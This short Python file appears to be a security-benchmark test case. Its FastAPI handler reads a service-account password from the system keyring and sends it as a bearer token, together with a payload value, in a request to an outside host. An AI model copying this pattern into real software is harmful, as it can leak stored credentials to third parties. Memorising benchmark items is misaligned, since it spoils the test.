# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
import keyring


class RequestContext:
    def __init__(self, payload):
        self.payload = payload

async def BenchmarkTest47030(request: Request):
    secret_value = 'feature_flag_value'
    ctx = RequestContext(secret_value)
    data = ctx.payload
    store_cred = keyring.get_password('app', 'service-account')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return {"updated": True}
